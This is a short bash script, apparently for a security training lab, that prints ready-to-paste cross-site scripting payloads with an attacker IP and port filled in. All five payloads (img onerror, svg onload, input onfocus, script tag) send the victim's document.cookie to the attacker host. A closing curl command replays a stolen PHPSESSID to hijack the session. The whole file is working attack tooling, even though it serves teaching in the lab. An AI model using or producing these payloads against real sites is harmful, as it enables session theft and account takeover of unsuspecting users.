#!/usr/bin/env bash
# =====================================================================
# generate_payload.sh
# ---------------------------------------------------------------------
# Print copy-paste-ready XSS payloads with the attacker IP filled in.
# Useful when the lab IPs change between sessions / between learners.
#
# Usage:
#   bash generate_payload.sh <ATTACKER_IP> [PORT]
#
# Examples:
#   bash generate_payload.sh 10.0.2.3
#   bash generate_payload.sh 192.168.99.10 8080
# =====================================================================
set -euo pipefail

ATTACKER_IP="${1:-}"
PORT="${2:-8080}"

if [[ -z "$ATTACKER_IP" ]]; then
    echo "Usage: $0 <ATTACKER_IP> [PORT]"
    echo "Tip:   run 'ip a | grep inet' first to find your IP."
    exit 1
fi

# Very loose sanity check — makes sure it looks like an IPv4
if ! [[ "$ATTACKER_IP" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    echo "[!] '$ATTACKER_IP' does not look like an IPv4 address."
    exit 1
fi

URL="http://${ATTACKER_IP}:${PORT}"

cat <<EOF
=== Payloads for ATTACKER_IP = ${ATTACKER_IP} (port ${PORT}) ===

[1] Image onerror (recommended for most filters)
<img src=x onerror="this.src='${URL}/?c='+document.cookie">

[2] SVG onload
<svg onload="fetch('${URL}/?c='+document.cookie)">

[3] Image onerror with base64-encoded cookie (cleaner transport)
<img src=x onerror="fetch('${URL}/?c='+btoa(document.cookie))">

[4] Input autofocus + onfocus
<input autofocus onfocus="location='${URL}/?c='+document.cookie">

[5] Classic <script> tag (often blocked by basic filters; useful for
    showing a failed trial in the report)
<script>document.location='${URL}/?c='+document.cookie</script>

REPLAY COMMAND once you have captured a cookie value:
  curl -i -b "PHPSESSID=<STOLEN_VALUE>" ${URL%:*}:8001
EOF
